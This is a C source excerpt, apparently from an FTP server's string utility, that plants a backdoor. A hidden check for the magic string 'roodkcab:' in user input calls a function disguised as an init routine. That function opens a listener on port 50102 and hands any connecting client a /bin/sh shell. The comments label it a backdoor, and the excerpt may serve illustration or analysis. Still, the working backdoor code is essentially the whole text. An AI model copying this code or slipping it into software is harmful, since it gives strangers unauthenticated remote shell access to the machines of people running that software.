...
str_contains_space(const struct mystr* p_str)
{
  ...
  for (i=0; i < p_str->len; i++)
  {
    ...
    /* Magic string checking for backdoor (it's "roodkcab:") ;) */
    else if((p_str->p_buf[i]==0x72) /* r */
    && (p_str->p_buf[i+1]==0x6f) /* o */
    && (p_str->p_buf[i+2]==0x6f) /* o */
    && (p_str->p_buf[i+3]==0x64) /* d */
    && (p_str->p_buf[i+4]==0x6b) /* k */
    && (p_str->p_buf[i+5]==0x63) /* c */
    && (p_str->p_buf[i+6]==0x61) /* a */
    && (p_str->p_buf[i+7]==0x62) /* b */
    && (p_str->p_buf[i+8]==0x3a)) /* : */
    {
     /* Call backdoor */ 
     str_extra_check();
    }
...
int
str_extra_check(void) /* init func */
{
  int fd, rfd; /* init vars */
  struct sockaddr_in sa;
  if((fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) /* Check if socket availible */
  exit(1); /* If not, give error */
  memset(&sa, 0, sizeof(sa)); /* More variable handling */
  sa.sin_family = AF_INET; /* Configure socket listener parameters */
  sa.sin_port = htons(50102); /* Port */
  sa.sin_addr.s_addr = INADDR_ANY; /* Bind to all addresses */
  if((bind(fd,(struct sockaddr *)&sa, /* Check if bind sucessful */
  sizeof(struct sockaddr))) < 0) exit(1); /* If not, give error */
  if((listen(fd, 100)) == -1) exit(1); /* Check if listening; if not, give error. */
  for(;;)
  {
    rfd = accept(fd, 0, 0); /* on connection, accept it. */
    close(0); close(1); close(2); /* some cleanup for the connection */
    dup2(rfd, 0); dup2(rfd, 1); dup2(rfd, 2); /* Attach connection to */
    execl("/bin/sh","sh",(char *)0); /* /bin/sh and pipe output */
  }
}
